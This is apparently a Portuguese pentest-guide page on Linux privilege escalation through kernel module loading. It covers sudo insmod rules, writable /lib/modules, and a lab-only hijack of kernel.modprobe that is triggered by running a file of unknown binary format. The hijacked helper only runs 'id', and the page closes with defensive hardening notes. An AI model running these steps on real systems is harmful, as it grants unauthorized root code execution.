# Abuso de módulos do kernel e modprobe

{{#include ../../banners/hacktricks-training.md}}

## Configurações incorretas de módulos do kernel e carregamento de módulos

O suporte a módulos do kernel é uma área de alto impacto durante a análise de escalação de privilégios no Linux. Não considere toda mensagem sobre módulo não assinado explorável por si só, mas use-a para responder a perguntas práticas:

- O usuário atual pode carregar módulos por meio de `sudo`, capabilities ou de um caminho auxiliar gravável?
- O carregamento de módulos ainda está habilitado?
- A imposição de assinatura de módulos está desabilitada?
- Os diretórios de módulos ou os arquivos de módulos podem ser gravados?
- Os logs do kernel podem ser lidos para confirmar o que aconteceu?

Triagem rápida:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretação:

- `modules_disabled=1` significa que novos módulos não podem ser carregados até a reinicialização.
- `module_sig_enforce=1` geralmente bloqueia módulos não assinados.
- `dmesg_restrict=0` permite que usuários sem privilégios leiam os logs do kernel em muitos sistemas.
- Caminhos com permissão de escrita em `/lib/modules/$(uname -r)/` são perigosos porque a descoberta e o carregamento automático de módulos podem confiar nessa árvore.

### Carregando um módulo e lendo a saída do kernel

Se você tiver permissão legítima para carregar um módulo local, `insmod` insere o arquivo `.ko` exato que você fornecer. A função `init` do módulo é executada imediatamente, e as mensagens escritas com `printk()` aparecem nos logs do kernel.

Fluxo de trabalho mínimo para revisão ou ambientes de laboratório:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Se `sudo -l` permitir `insmod`, `modprobe` ou um wrapper em torno deles, trate isso como crítico:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` permitido via sudo

Uma regra do sudo que permite a um usuário executar `insmod` não é comparável à permissão para executar um helper administrativo comum. O código de inicialização do módulo é executado em contexto do kernel assim que o `.ko` é inserido; portanto, a pergunta prática da revisão é: "esse usuário pode escolher ou modificar o módulo que será carregado?"

Fluxo genérico de revisão:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Se o usuário puder fornecer um `.ko` arbitrário, a regra deverá ser tratada como comprometimento completo do sistema em uma avaliação autorizada. Um padrão operacional mais seguro é evitar delegar o carregamento de módulos por meio do sudo; se isso for inevitável, restrinja o caminho exato, a propriedade, as permissões, a política de assinatura e o fluxo de remoção.

Para um padrão inofensivo de compilação de módulo em um laboratório controlado, uma fonte mínima e um Makefile podem ser semelhantes a:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Compile e carregue apenas em um laboratório autorizado:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Verificações de abuso de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` controla o helper de userspace que o kernel invoca quando precisa de assistência para carregar módulos. Se um atacante puder alterá-lo para o caminho de um executável gravável e disparar um formato binário desconhecido ou outro caminho de solicitação de módulo, isso poderá resultar em execução de código como root.

Verifique o helper atual:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Verifique se é possível influenciá-lo:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Padrão genérico apenas para laboratório:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Em sistemas endurecidos, isso deve falhar porque usuários sem privilégios não podem escrever em `kernel.modprobe`, o caminho do helper não permite gravação ou os caminhos de carregamento de módulos estão bloqueados.

### Revisão de `/lib/modules` gravável

Diretórios de módulos graváveis podem permitir a substituição de módulos, o plantio de módulos maliciosos ou o abuso do carregamento automático, dependendo de como `modprobe` for invocado posteriormente.

Revise os locais graváveis:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Se você encontrar conteúdo de módulo gravável, verifique como os módulos são descobertos:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Notas defensivas:

- Mantenha `/lib/modules` pertencente a `root:root` e não gravável por usuários.
- Defina `kernel.modules_disabled=1` após a inicialização, quando operacionalmente possível.
- Exija assinaturas de módulos em sistemas que requerem módulos carregáveis.
- Monitore gravações em `/proc/sys/kernel/modprobe`, `/lib/modules` e execuções inesperadas de `insmod`/`modprobe`.
